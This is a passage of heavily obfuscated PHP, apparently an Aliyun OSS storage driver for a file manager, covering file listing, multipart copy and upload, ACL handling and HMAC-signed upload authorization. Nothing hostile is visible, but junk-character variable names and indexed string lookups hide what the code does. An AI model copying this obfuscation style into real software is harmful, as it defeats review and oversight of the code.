$¹¨¥ôçÙ); return empty($„ı¤À¢Î); } public function mkfile($Ô’¤Éœ, $ïˆ²Ôø¦ = '', $ÉŒŸº·Ö = REPEAT_RENAME) { $û…ÕÜ = $this->setContent($Ô’¤Éœ, $ïˆ²Ôø¦); if ($û…ÕÜ !== !1) { return $this->getPathOuter($Ô’¤Éœ); } return !1; } public function mkdir($ Å¾Ë­, $¶şş“‘ = REPEAT_SKIP) { if ($¶şş“‘ && $this->_isFolder($ Å¾Ë­)) { return $this->getPathOuter($ Å¾Ë­); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ Å¾Ë­)); } catch (OSS\Core\OssException $š‡îùÁŠ) { $this->writeLog(__FUNCTION__ . $_SERVER[¡¬ıÜ ƒ][214] . $š‡îùÁŠ->getMessage()); return !1; } return $this->getPathOuter($ Å¾Ë­); } private function fileList($ÉÉƒ¦ú, $çìÒÓÍğ = '', $ıíı«• = 0) { $—ó¶´§ =& $_SERVER[¡¬ıÜ ƒ]; $ÉÉƒ¦ú = trim($ÉÉƒ¦ú, $—ó¶´§[8]); $Ÿñ¾‡™ş = empty($ÉÉƒ¦ú) && $ÉÉƒ¦ú !== $—ó¶´§[230] ? $—ó¶´§[12] : $ÉÉƒ¦ú . $—ó¶´§[8]; $ì“ÕàÓ = $—ó¶´§[12]; $’ÉÕšó = 1000; $îØû±¦— = $Ëı©õ­« = array(); while (!0) { check_abort(); $ñêÎ™æì = array($—ó¶´§[1485] => $çìÒÓÍğ, $—ó¶´§[1486] => $Ÿñ¾‡™ş, $—ó¶´§[1487] => $’ÉÕšó, $—ó¶´§[1488] => $ì“ÕàÓ); try { $•‡üµèò = $this->client->listObjects($this->bucket, $ñêÎ™æì); } catch (OSS\Core\OssException $Ó¤µŸğ¢) { $this->writeLog(__FUNCTION__ . $—ó¶´§[214] . $Ó¤µŸğ¢->getMessage()); break; } $ì“ÕàÓ = $•‡üµèò->getNextMarker(); $Şˆ†øé¨ = $•‡üµèò->getObjectList(); $¿ÁÎ°Œ = $•‡üµèò->getPrefixList(); foreach ($Şˆ†øé¨ as $¾ì‡¸’) { if ($¾ì‡¸’->getKey() == $Ÿñ¾‡™ş) { continue; } $ÄæùØ = $¾ì‡¸’->getKey(); $°‹šÓ»Æ = $¾ì‡¸’->getSize(); $Ö¨ÁŒÉæ = $¾ì‡¸’->getLastModified(); $Î¥´úÛĞ = trim($¾ì‡¸’->getETag(), $—ó¶´§[121]); $Ù¡á–› = $ıíı«• ? array($—ó¶´§[32] => $ÄæùØ, $—ó¶´§[79] => $°‹šÓ»Æ, $—ó¶´§[206] => strtotime($Ö¨ÁŒÉæ), $—ó¶´§[1489] => $Î¥´úÛĞ) : $ÄæùØ; $›Ò™íÜ» = $°‹šÓ»Æ == 0 && substr($ÄæùØ, strlen($ÄæùØ) - 1, 1) == $—ó¶´§[8] ? !0 : !1; $Êğï‹Ğæ = array($—ó¶´§[79] => $°‹šÓ»Æ, $—ó¶´§[1490] => $°‹šÓ»Æ, $—ó¶´§[88] => strtotime($Ö¨ÁŒÉæ), $—ó¶´§[1491] => $Ö¨ÁŒÉæ, $—ó¶´§[1489] => $Î¥´úÛĞ); $this->cacheMethodInfoSet($ÄæùØ, $›Ò™íÜ», $Êğï‹Ğæ); if ($›Ò™íÜ») { $îØû±¦—[] = $ÄæùØ; continue; } $Ëı©õ­«[] = $Ù¡á–›; } foreach ($¿ÁÎ°Œ as $Ğúş¤§È) { $îØû±¦—[] = $Ğúş¤§È->getPrefix(); $this->cacheMethodInfoSet($Ğúş¤§È->getPrefix(), !0); } if ($ì“ÕàÓ === $—ó¶´§[12]) { break; } } $this->cacheMethodInfoSet($ÉÉƒ¦ú, !0); return array($—ó¶´§[85] => $îØû±¦—, $—ó¶´§[86] => $Ëı©õ­«); } public function listObject($àŸØ…Êø, $åé´õ€ = '') { $˜•À¶­§ =& $_SERVER[¡¬ıÜ ƒ]; $àŸØ…Êø = trim($àŸØ…Êø, $˜•À¶­§[8]); $È±·Ä†´ = empty($àŸØ…Êø) && $àŸØ…Êø !== $˜•À¶­§[230] ? $˜•À¶­§[12] : $àŸØ…Êø . $˜•À¶­§[8]; $«×Ììè = $˜•À¶­§[12]; $‹ãÖñúƒ = 1000; $ñ…··ê = $Õ±æĞı = array(); while (!0) { check_abort(); $‹³Çà•Û = array($˜•À¶­§[1485] => $åé´õ€, $˜•À¶­§[1486] => $È±·Ä†´, $˜•À¶­§[1487] => $‹ãÖñúƒ, $˜•À¶­§[1488] => $«×Ììè); try { $¾×‘ö—» = $this->client->listObjects($this->bucket, $‹³Çà•Û); } catch (OSS\Core\OssException $Ü­Úä™³) { $this->writeLog(__FUNCTION__ . $˜•À¶­§[214] . $Ü­Úä™³->getMessage()); break; } $«×Ììè = $¾×‘ö—»->getNextMarker(); $ÁŒõòÚ = $¾×‘ö—»->getObjectList(); foreach ($ÁŒõòÚ as $†°­–ŠÂ) { if ($†°­–ŠÂ->getKey() == $È±·Ä†´) { continue; } $»×ûÀˆ¯ = $†°­–ŠÂ->getKey(); $¿ä¾åà = $†°­–ŠÂ->getSize(); $ŸÉØ°‰÷ = $¿ä¾åà == 0 && substr($»×ûÀˆ¯, strlen($»×ûÀˆ¯) - 1, 1) == $˜•À¶­§[8] ? !0 : !1; if ($ŸÉØ°‰÷) { continue; } $Õ±æĞı[] = $¿ä¾åà . $˜•À¶­§[214] . $»×ûÀˆ¯; } if ($«×Ììè === $˜•À¶­§[12]) { break; } } return array($˜•À¶­§[85] => $ñ…··ê, $˜•À¶­§[86] => $Õ±æĞı); } public function copyFile($êé„Î™„, $‰ƒµÒçµ) { $œ¦»ü× = $this->size($êé„Î™„); if ($œ¦»ü× < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $êé„Î™„, $this->bucket, $this->pathEncode($‰ƒµÒçµ)); } catch (OSS\Core\OssException $ ³ÊŠ˜Ó) { $this->writeLog(__FUNCTION__ . $_SERVER[¡¬ıÜ ƒ][214] . $ ³ÊŠ˜Ó->getMessage()); return !1; } return $this->getPathOuter($‰ƒµÒçµ); } $îùÉùÍú = $this->multiCopyObject($êé„Î™„, $‰ƒµÒçµ, $œ¦»ü×); return $îùÉùÍú ? $this->getPathOuter($‰ƒµÒçµ) : !1; } private function multiCopyObject($›İï¾Éğ, $ù¦æü€İ, $Óô‹â“Å) { $×®ôöçÛ =& $_SERVER[¡¬ıÜ ƒ]; try { $Òú÷Ìº© = array(); if ($¡˜ç–Î¹ = $this->hashMd5($›İï¾Éğ)) { $Òú÷Ìº© = array(OSS\OssClient::OSS_HEADERS => array($×®ôöçÛ[1492] => $¡˜ç–Î¹)); } $É¹ª÷ë = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ù¦æü€İ), $Òú÷Ìº©); $›ôÙ²şú = 1; $‡Û¾º± = 0; $ÂÖîî¤ = array(); $äƒÙãÎ¸ = 1024 * 1024 * 10; $Ş‰Ó¾˜¼ = $this->client->generateMultiuploadParts($Óô‹â“Å, $äƒÙãÎ¸); foreach ($Ş‰Ó¾˜¼ as $ì±¬¸÷ => $’öËÑÀÏ) { $•‚¡¡½× = $‡Û¾º± + (int) $’öËÑÀÏ[$×®ôöçÛ[1493]]; $œÜòª©¬ = (int) $’öËÑÀÏ[$×®ôöçÛ[414]] + $•‚¡¡½× - 1; $Ãæ´¶¥á = array($×®ôöçÛ[167] => $•‚¡¡½×, $×®ôöçÛ[168] => $œÜòª©¬); $ÂÖîî¤[] = $this->client->uploadPartCopy($this->bucket, $›İï¾Éğ, $this->bucket, $this->pathEncode($ù¦æü€İ), $›ôÙ²şú, $É¹ª÷ë, $Ãæ´¶¥á); $›ôÙ²şú = $›ôÙ²şú + 1; } $÷³¼¬âÚ = array(); foreach ($ÂÖîî¤ as $ì±¬¸÷ => $¤ëù®¶Ï) { $÷³¼¬âÚ[] = array($×®ôöçÛ[299] => $ì±¬¸÷ + 1, $×®ôöçÛ[300] => $¤ëù®¶Ï); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ù¦æü€İ), $É¹ª÷ë, $÷³¼¬âÚ); } catch (OSS\Core\OssException $¢™÷¬Šü) { $this->writeLog(__FUNCTION__ . $×®ôöçÛ[214] . $¢™÷¬Šü->getMessage()); return !1; } return !0; } public function moveFile($«ä¡æíâ, $×·‡ô†) { if ($this->copyFile($«ä¡æíâ, $×·‡ô†)) { $this->remove($«ä¡æíâ); return $this->getPathOuter($×·‡ô†); } return !1; } public function delFile($©Ï—À‡ñ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($©Ï—À‡ñ)); } catch (OSS\Core\OssException $Ü¤¢û±) { $this->writeLog(__FUNCTION__ . $_SERVER[¡¬ıÜ ƒ][214] . $Ü¤¢û±->getMessage()); return !1; } return !0; } public function delFolder($»¬»ü¶Ä) { $Ç˜Š¯¢† =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->exist($»¬»ü¶Ä)) { return !0; } $this->listItemCache = !1; $¯ÅŞÜş¼ = $this->fileList($»¬»ü¶Ä); $this->listItemCache = !0; $ü†Ñ–åŸ = trim($»¬»ü¶Ä, $Ç˜Š¯¢†[8]) . $Ç˜Š¯¢†[8]; if (!empty($»¬»ü¶Ä) && $»¬»ü¶Ä !== $Ç˜Š¯¢†[230] && !in_array($ü†Ñ–åŸ, $¯ÅŞÜş¼[$Ç˜Š¯¢†[85]])) { $¯ÅŞÜş¼[$Ç˜Š¯¢†[85]][] = $ü†Ñ–åŸ; } $­ İ‚‹ = $this->delByBatch($¯ÅŞÜş¼[$Ç˜Š¯¢†[86]]); if (!$­ İ‚‹) { return !1; } $­ İ‚‹ = $this->delByBatch($¯ÅŞÜş¼[$Ç˜Š¯¢†[85]]); if (!$­ İ‚‹) { return !1; } return $this->delFile($ü†Ñ–åŸ); } private function delByBatch($ŸÙò¹) { foreach (array_chunk($ŸÙò¹, 1000) as $ ŞŠÏ) { try { $this->client->deleteObjects($this->bucket, $ ŞŠÏ); } catch (OSS\Core\OssException $çï“³áî) { $this->writeLog(__FUNCTION__ . $_SERVER[¡¬ıÜ ƒ][214] . $çï“³áî->getMessage()); return !1; } } return !0; } public function rename($–•Œéºü, $­÷úÏ¡Ÿ) { return $this->renameObject($–•Œéºü, $­÷úÏ¡Ÿ); } private function fileInfo($âÍÎ³î“, $•œıı§ = false, $¤è±»ì† = array()) { $Ğñ²£ë =& $_SERVER[¡¬ıÜ ƒ]; $—­§Öîó = array($Ğñ²£ë[32] => $this->pathThis($âÍÎ³î“), $Ğñ²£ë[87] => $this->getPathOuter($âÍÎ³î“), $Ğñ²£ë[33] => $Ğñ²£ë[232], $Ğñ²£ë[79] => isset($¤è±»ì†[$Ğñ²£ë[79]]) ? $¤è±»ì†[$Ğñ²£ë[79]] : 0, $Ğñ²£ë[169] => $this->ext($âÍÎ³î“)); if ($•œıı§) { return $—­§Öîó; } $—­§Öîó[$Ğñ²£ë[233]] = $—­§Öîó[$Ğñ²£ë[88]] = 0; $—­§Öîó[$Ğñ²£ë[234]] = $—­§Öîó[$Ğñ²£ë[235]] = !0; if (empty($¤è±»ì†)) { $²È³àªÖ = $this->objectMeta($âÍÎ³î“); if (!$²È³àªÖ) { return $—­§Öîó; } $¤è±»ì† = array($Ğñ²£ë[88] => strtotime($²È³àªÖ[$Ğñ²£ë[1491]]), $Ğñ²£ë[79] => $²È³àªÖ[$Ğñ²£ë[1490]] + 0, $Ğñ²£ë[1489] => $²È³àªÖ[$Ğñ²£ë[1489]]); } if (isset($¤è±»ì†[$Ğñ²£ë[1489]]) && $¤è±»ì†[$Ğñ²£ë[1489]]) { $—­§Öîó[$Ğñ²£ë[237]] = trim($¤è±»ì†[$Ğñ²£ë[1489]], $Ğñ²£ë[121]); } if (isset($¤è±»ì†[$Ğñ²£ë[79]])) { $—­§Öîó[$Ğñ²£ë[79]] = $¤è±»ì†[$Ğñ²£ë[79]]; } if (isset($¤è±»ì†[$Ğñ²£ë[88]])) { $—­§Öîó[$Ğñ²£ë[88]] = $¤è±»ì†[$Ğñ²£ë[88]]; } if (isset($¤è±»ì†[$Ğñ²£ë[206]]) && !trim($—­§Öîó[$Ğñ²£ë[88]])) { $—­§Öîó[$Ğñ²£ë[88]] = $¤è±»ì†[$Ğñ²£ë[206]]; } return $—­§Öîó; } private function folderInfo($öïøÁ¸, $áÔèÑş« = false, $¨ßÓŸ¾ = array()) { $ªÉ•İ°« =& $_SERVER[¡¬ıÜ ƒ]; $ß×ñËƒ– = array($ªÉ•İ°«[32] => $this->pathThis($öïøÁ¸), $ªÉ•İ°«[87] => $this->getPathOuter($ªÉ•İ°«[8] . $öïøÁ¸), $ªÉ•İ°«[33] => $ªÉ•İ°«[78]); if ($áÔèÑş«) { return $ß×ñËƒ–; } $ß×ñËƒ–[$ªÉ•İ°«[233]] = $ß×ñËƒ–[$ªÉ•İ°«[88]] = 0; $ß×ñËƒ–[$ªÉ•İ°«[234]] = $ß×ñËƒ–[$ªÉ•İ°«[235]] = !0; if (empty($¨ßÓŸ¾)) { $öïøÁ¸ = rtrim($öïøÁ¸, $ªÉ•İ°«[8]) . $ªÉ•İ°«[8]; $Ô‡ìÍó° = $this->objectMeta($öïøÁ¸); if (!$Ô‡ìÍó°) { return $ß×ñËƒ–; } $¨ßÓŸ¾ = array($ªÉ•İ°«[233] => $Ô‡ìÍó°[$ªÉ•İ°«[577]][$ªÉ•İ°«[1494]], $ªÉ•İ°«[88] => strtotime($Ô‡ìÍó°[$ªÉ•İ°«[1491]])); } if (isset($¨ßÓŸ¾[$ªÉ•İ°«[88]])) { $ß×ñËƒ–[$ªÉ•İ°«[88]] = $¨ßÓŸ¾[$ªÉ•İ°«[88]]; } if (isset($¨ßÓŸ¾[$ªÉ•İ°«[233]])) { $ß×ñËƒ–[$ªÉ•İ°«[233]] = $¨ßÓŸ¾[$ªÉ•İ°«[233]]; } return $ß×ñËƒ–; } public function listPath($™Ğ›³Œ, $•¹ÅÓ‹ = false) { $›ğÄß’Î =& $_SERVER[¡¬ıÜ ƒ]; $”›ı·Û¹ = $this->fileList($™Ğ›³Œ, $›ğÄß’Î[8], !0); foreach ($”›ı·Û¹[$›ğÄß’Î[85]] as $œŠ¹Õ„İ => $÷©ò‚Íà) { $”›ı·Û¹[$›ğÄß’Î[85]][$œŠ¹Õ„İ] = $this->folderInfo($÷©ò‚Íà, $•¹ÅÓ‹, $÷©ò‚Íà); } foreach ($”›ı·Û¹[$›ğÄß’Î[86]] as $œŠ¹Õ„İ => $÷©ò‚Íà) { $”›ı·Û¹[$›ğÄß’Î[86]][$œŠ¹Õ„İ] = $this->fileInfo($÷©ò‚Íà[$›ğÄß’Î[32]], $•¹ÅÓ‹, $÷©ò‚Íà); } return $”›ı·Û¹; } protected function infoChildren($Ïí¯£ã, &$”ßæŒ¿ï) { $ü¬öÆ» =& $_SERVER[¡¬ıÜ ƒ]; $²ÜÕ¿ªé = $this->fileList($Ïí¯£ã, $ü¬öÆ»[12], !0); $”ßæŒ¿ï[$ü¬öÆ»[81]] += count($²ÜÕ¿ªé[$ü¬öÆ»[85]]); $”ßæŒ¿ï[$ü¬öÆ»[80]] += count($²ÜÕ¿ªé[$ü¬öÆ»[86]]); foreach ($²ÜÕ¿ªé[$ü¬öÆ»[86]] as $æÍ¢ŸÒ•) { if (!$æÍ¢ŸÒ• || !$æÍ¢ŸÒ•[$ü¬öÆ»[79]]) { continue; } $”ßæŒ¿ï[$ü¬öÆ»[79]] += $æÍ¢ŸÒ•[$ü¬öÆ»[79]]; } } public function has($ù§ş¶†Ú, $€È¯Úâ = false, $†”å„¶’ = true) { $³Û¬‰‰ =& $_SERVER[¡¬ıÜ ƒ]; $ù§ş¶†Ú = trim($ù§ş¶†Ú, $³Û¬‰‰[8]); $À¶ÁÌ‚È = empty($ù§ş¶†Ú) && $ù§ş¶†Ú !== $³Û¬‰‰[230] ? $³Û¬‰‰[12] : $ù§ş¶†Ú . $³Û¬‰‰[8]; $É¹âìíû = $³Û¬‰‰[12]; $ş£¹ë£´ = 500; $İÉ·­¥ = $„˜ÆÁÅÉ = 0; while (!0) { check_abort(); $½«Û®º£ = array($³Û¬‰‰[1485] => $³Û¬‰‰[8], $³Û¬‰‰[1486] => $À¶ÁÌ‚È, $³Û¬‰‰[1487] => $ş£¹ë£´, $³Û¬‰‰[1488] => $É¹âìíû); try { $ª¤Â†ÀÈ = $this->client->listObjects($this->bucket, $½«Û®º£); } catch (OSS\Core\OssException $¹ãşÁƒï) { $this->writeLog(__FUNCTION__ . $³Û¬‰‰[214] . $¹ãşÁƒï->getMessage()); break; } $É¹âìíû = $ª¤Â†ÀÈ->getNextMarker(); $ıÖŞáé„ = $ª¤Â†ÀÈ->getObjectList(); $ãıÛù£Š = $ª¤Â†ÀÈ->getPrefixList(); if ($€È¯Úâ) { if (count($ıÖŞáé„) > 1 || count($ıÖŞáé„) == 1 && $ıÖŞáé„[0]->getKey() != $À¶ÁÌ‚È) { $İÉ·­¥ += count($ıÖŞáé„) - 1; } if (!empty($ãıÛù£Š)) { $„˜ÆÁÅÉ += count($ãıÛù£Š); } if ($É¹âìíû === $³Û¬‰‰[12]) { break; } continue; } if ($†”å„¶’) { if (!empty($ıÖŞáé„)) { if (count($ıÖŞáé„) > 1 || $ıÖŞáé„[0]->getKey() != $À¶ÁÌ‚È) { return !0; } } } else { if (!empty($ãıÛù£Š)) { return !0; } } if ($É¹âìíû === $³Û¬‰‰[12]) { break; } } if ($€È¯Úâ) { return array($³Û¬‰‰[241] => $İÉ·­¥, $³Û¬‰‰[242] => $„˜ÆÁÅÉ); } return !1; } public function listAll($ö·‚Üë‰) { $À “¶ı‘ =& $_SERVER[¡¬ıÜ ƒ]; $‰äŸö = $this->fileList($ö·‚Üë‰, $À “¶ı‘[12], !0); $‚¤ïüØœ = array_to_keyvalue($‰äŸö[$À “¶ı‘[86]], $À “¶ı‘[32]); foreach ($‰äŸö[$À “¶ı‘[85]] as $ĞÔÙ€¾÷) { if (is_string($ĞÔÙ€¾÷)) { $‚¤ïüØœ[$ĞÔÙ€¾÷] = array($À “¶ı‘[79] => 0); } } return $this->listAllFiles($ö·‚Üë‰, $‚¤ïüØœ); } public function canRead($ÎšÆşÏ) { $ƒú÷×‡Ú =& $_SERVER[¡¬ıÜ ƒ]; $ŞÑæíï = $this->pathAcl($ÎšÆşÏ); return $ŞÑæíï == $ƒú÷×‡Ú[1495] || $ŞÑæíï == $ƒú÷×‡Ú[624] ? !0 : !1; } public function canWrite($‡ÄÂêõÅ) { $‰Ô›«˜ï = $this->pathAcl($‡ÄÂêõÅ); return $‰Ô›«˜ï == $_SERVER[¡¬ıÜ ƒ][624] ? !0 : !1; } public function pathAcl($Çª§÷ø) { $´—ÏÊ°á =& $_SERVER[¡¬ıÜ ƒ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $å¡¯İ¸¢ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Çª§÷ø)); } catch (OSS\Core\OssException $¤€æ×²) { $this->writeLog(__FUNCTION__ . $´—ÏÊ°á[214] . $¤€æ×²->getMessage()); return !1; } $¤§ÅÙ‘ = $å¡¯İ¸¢ == $´—ÏÊ°á[37] ? $this->bucketAcl : $å¡¯İ¸¢; if ($¤§ÅÙ‘ == $´—ÏÊ°á[1496]) { return $´—ÏÊ°á[1495]; } if ($¤§ÅÙ‘ == $´—ÏÊ°á[1497]) { return $´—ÏÊ°á[624]; } return $¤§ÅÙ‘; } private function chmodPath($³®İÙ, $™ĞİÈâ« = '') { $ÆÙúÎ»“ =& $_SERVER[¡¬ıÜ ƒ]; $êÓîŞ¬ = empty($™ĞİÈâ«) ? $ÆÙúÎ»“[1497] : $™ĞİÈâ«; $·™î¬ó = array($ÆÙúÎ»“[37], $ÆÙúÎ»“[231], $ÆÙúÎ»“[1496], $ÆÙúÎ»“[1497]); if (!in_array($êÓîŞ¬, $·™î¬ó)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($³®İÙ), $êÓîŞ¬); } catch (OSS\Core\OssException $æß…ºÛÜ) { $this->writeLog(__FUNCTION__ . $ÆÙúÎ»“[214] . $æß…ºÛÜ->getMessage()); return !1; } return !0; } public function getContent($çãöèØ) { return $this->fileSubstr($çãöèØ, -1); } public function setContent($Æ½åÒ«, $®€ÊÆçÀ = '') { $õâ§šó =& $_SERVER[¡¬ıÜ ƒ]; try { $œ¤ãÏ“À = $this->trafficLimit($õâ§šó[1498]); $¸èÅ íç = $this->client->putObject($this->bucket, $this->pathEncode($Æ½åÒ«), $®€ÊÆçÀ, $œ¤ãÏ“À); } catch (OSS\Core\OssException $ÁöÆÓ¶) { $this->writeLog(__FUNCTION__ . $õâ§šó[214] . $ÁöÆÓ¶->getMessage()); return !1; } $˜ßÊ÷Ú = array($õâ§šó[1492] => trim($¸èÅ íç[$õâ§šó[1489]], $õâ§šó[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Æ½åÒ«))); $this->updateObjMeta($Æ½åÒ«, $˜ßÊ÷Ú); return isset($¸èÅ íç[$õâ§šó[1499]][$õâ§šó[296]]) ? !0 : !1; } private function updateObjMeta($œ²ˆØğá, $ÑºÛü£İ) { $œ²ˆØğá = $this->pathEncode($œ²ˆØğá); try { $í£‰’ùŠ = array(OSS\OssClient::OSS_HEADERS => $ÑºÛü£İ); $this->client->copyObject($this->bucket, $œ²ˆØğá, $this->bucket, $œ²ˆØğá, $í£‰’ùŠ); } catch (OSS\Core\OssException $¢âĞ· ) { $this->writeLog(__FUNCTION__ . $_SERVER[¡¬ıÜ ƒ][214] . $¢âĞ· ->getMessage()); return !1; } return !0; } public function upload($–´úªÍ, $×·ÂÍ“¸, $ªëØ÷ß = false, $›¤Ì½Í„ = REPEAT_REPLACE) { $šñ¼ø =& $_SERVER[¡¬ıÜ ƒ]; $‘ ‘çêÃ = trim($–´úªÍ, $šñ¼ø[8]); $±úßå¦  = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($šñ¼ø[1492] => @md5_file($×·ÂÍ“¸)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($–´úªÍ))); $±úßå¦  = $this->trafficLimit($šñ¼ø[1498], $±úßå¦ ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($‘ ‘çêÃ), $×·ÂÍ“¸, $±úßå¦ ); } catch (OSS\Core\OssException $ßĞ¸Ãó…) { $this->writeLog(__FUNCTION__ . $šñ¼ø[214] . $ßĞ¸Ãó…->getMessage()); return !1; } return $this->getPathOuter($–´úªÍ); } public function getHost() { $—óˆœ•É =& $_SERVER[¡¬ıÜ ƒ]; $ü³«ÜÀ = explode($—óˆœ•É[210], parent::getHost()); return $ü³«ÜÀ[0] . $—óˆœ•É[210] . $this->bucket . $—óˆœ•É[10] . $ü³«ÜÀ[1]; } public function uploadFormData($Ñ¼äÙ¸¼, $ĞùÁê = 3600) { $ÉÄÌ­·… =& $_SERVER[¡¬ıÜ ƒ]; if (!($â×±Ô÷Ô = $this->getHost())) { return !1; } $Êö Î¸ = $ĞùÁê; $Ë¢Ëå¾ø = date($ÉÄÌ­·…[1500], time() + $Êö Î¸); $¦‚Ò¼§º = new DateTime($Ë¢Ëå¾ø); $†™Ä’Û· = $¦‚Ò¼§º->format(DateTime::ISO8601); $ÆÅ³¾ = strpos($†™Ä’Û·, $ÉÄÌ­·…[373]); $†™Ä’Û· = substr($†™Ä’Û·, 0, $ÆÅ³¾) . $ÉÄÌ­·…[1501]; $÷ Ÿš›¢ = 1048576000 * 5; $¦‚ƒ“©µ = $this->pathFather($Ñ¼äÙ¸¼); $†ªµæ› = array($ÉÄÌ­·…[264] => $†™Ä’Û·, $ÉÄÌ­·…[267] => array(array($ÉÄÌ­·…[1502], 0, $÷ Ÿš›¢), array($ÉÄÌ­·…[269], $ÉÄÌ­·…[270], $¦‚ƒ“©µ))); $îÄášı§ = base64_encode(json_encode($†ªµæ›)); $‘”‡£ã¶ = base64_encode(hash_hmac($ÉÄÌ­·…[1423], $îÄášı§, $this->secret, !0)); $œËßò­ = array($ÉÄÌ­·…[1503] => $this->accessKey, $ÉÄÌ­·…[279] => $îÄášı§, $ÉÄÌ­·…[272] => $ÉÄÌ­·…[263], $ÉÄÌ­·…[1504] => $‘”‡£ã¶, $ÉÄÌ­·…[208] => $â×±Ô÷Ô); $œËßò­ = $this->trafficLimit($ÉÄÌ­·…[1498], $œËßò­, !0); return $œËßò­; } public function uploadMultiData($‘äí¼Ğµ, $ƒü­ì¿ = 3600) { $–õ÷¿™ƒ =& $_SERVER[¡¬ıÜ ƒ]; if (!($ ú†Úø = $this->getHost())) { return !1; } $³‚ÂóĞ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($‘äí¼Ğµ)); return array($–õ÷¿™ƒ[283] => $³‚ÂóĞ, $–õ÷¿™ƒ[208] => $ ú†Úø . $–õ÷¿™ƒ[8] . $this->pathEncode($‘äí¼Ğµ), $–õ÷¿™ƒ[284] => gmdate($–õ÷¿™ƒ[1505]), $–õ÷¿™ƒ[97] => $‘äí¼Ğµ); } public function uploadMultiAuth($Ö¦½Ÿ‰Ñ, $·‘óÑß¶ = array()) { if (isset($·‘óÑß¶[$_SERVER[¡¬ıÜ ƒ][285]])) { return $this->uploadPartAuth($Ö¦½Ÿ‰Ñ, $·‘óÑß¶); } return $this->uploadListAuth($Ö¦½Ÿ‰Ñ, $·‘óÑß¶); } private function uploadPartAuth($ó¨è‚æ…, $çöú§Ñ¬ = array()) { $°Ñ«ĞÜ =& $_SERVER[¡¬ıÜ ƒ]; $éæ§°˜« = $çöú§Ñ¬[$°Ñ«ĞÜ[97]]; $·ÄÔî’ı = $this->_getUploadAuth($éæ§°˜«, $çöú§Ñ¬); $â„ãÈ« = array($°Ñ«ĞÜ[288] => $·ÄÔî’ı[$°Ñ«ĞÜ[288]], $°Ñ«ĞÜ[284] => $·ÄÔî’ı[$°Ñ«ĞÜ[284]]); if (isset($·ÄÔî’ı[$°Ñ«ĞÜ[1506]])) { $â„ãÈ«[$°Ñ«ĞÜ[1506]] = $·ÄÔî’ı[$°Ñ«ĞÜ[1506]]; } return $â„ãÈ«; } private function uploadListAuth($¯½†òÓ¯, $öÙÑÜ´ = array()) { $ğ×ÜşÁ™ =& $_SERVER[¡¬ıÜ ƒ]; $¿…é”ÒÃ = $öÙÑÜ´[$ğ×ÜşÁ™[97]]; $Ñ½³íÆ« = $öÙÑÜ´[$ğ×ÜşÁ™[283]]; $ÛşŞèÜË = $this->client->listParts($this->bucket, $this->pathEncode($¿…é”ÒÃ), $Ñ½³íÆ«); $ï‹»í×¢ = $ÛşŞèÜË->getListPart(); $·®è£‚ = array(); foreach ($ï‹»í×¢ as $ğıËìŒç) { $·®è£‚[] = array($ğ×ÜşÁ™[299] => $ğıËìŒç->getPartNumber(), $ğ×ÜşÁ™[300] => trim($ğıËìŒç->getETag(), $ğ×ÜşÁ™[121])); } if (!$·®è£‚) { return !1; } $Àš×®ô» = $this->_getUploadAuth($¿…é”ÒÃ, $öÙÑÜ´); return array($ğ×ÜşÁ™[288] => $Àš×®ô»[$ğ×ÜşÁ™[288]], $ğ×ÜşÁ™[284] => $Àš×®ô»[$ğ×ÜşÁ™[284]], $ğ×ÜşÁ™[291] => $·®è£‚); } private function _getUploadAuth($“¶ææËí, $²µ¼) { $„î¥ÇÅå =& $_SERVER[¡¬ıÜ ƒ]; $ÛÙ½ó«˜ = gmdate($„î¥ÇÅå[1505]); $ êÂÍüÁ = isset($²µ¼[$„î¥ÇÅå[285]]) ? $„î¥ÇÅå[255] : $„î¥ÇÅå[290]; $÷åèÃÅ´ = array_intersect_key($²µ¼, array_flip(array($„î¥ÇÅå[285], $„î¥ÇÅå[283]))); ksort($÷åèÃÅ´); $ø€ú©À° = $÷åèÃÅ´ ? $„î¥ÇÅå[76] . http_build_query($÷åèÃÅ´, null, $„î¥ÇÅå[286], PHP_QUERY_RFC3986) : $„î¥ÇÅå[12]; $·‡©ÚÏ¥ = array($ êÂÍüÁ, $„î¥ÇÅå[12], $„î¥ÇÅå[123], $ÛÙ½ó«˜, "\x78\x2d\x6f\163\163\55\x64\x61\164\x65\72{$ÛÙ½ó«˜}", $„î¥ÇÅå[8] . $this->bucket . $„î¥ÇÅå[8] . $“¶ææËí . $ø€ú©À°); if (isset($²µ¼[$„î¥ÇÅå[285]])) { $ãÇ—ãê¨ = $this->trafficLimit($„î¥ÇÅå[1498], array(), !0); if ($ãÇ—ãê¨) { $“¶ææËí = $„î¥ÇÅå[1506]; array_splice($·‡©ÚÏ¥, 5, 0, $“¶ææËí . $„î¥ÇÅå[4] . $ãÇ—ãê¨[$“¶ææËí]); } } $”—¸âÚû = implode($„î¥ÇÅå[287], $·‡©ÚÏ¥); $úÆ‚Îƒ = base64_encode(hash_hmac($„î¥ÇÅå[1423], $”—¸âÚû, $this->secret, !0)); $ìŞ…‹ú‡ = $„î¥ÇÅå[1475] . $this->accessKey . $„î¥ÇÅå[4] . $úÆ‚Îƒ; $Ë¶Á¯²ş = array($„î¥ÇÅå[288] => $ìŞ…‹ú‡, $„î¥ÇÅå[284] => $ÛÙ½ó«˜); if (!empty($ãÇ—ãê¨)) { $Ë¶Á¯²ş = array_merge($Ë¶Á¯²ş, $ãÇ—ãê¨); } return $Ë¶Á¯²ş; } public function download($Ë±°“¥¿, $´ãí±‘Û) { $½ÛîÔÍÔ =& $_SERVER[¡¬ıÜ ƒ]; if ($this->isFolder($Ë±°“¥¿)) { return !1; } try { $Ö™®ÀøË = 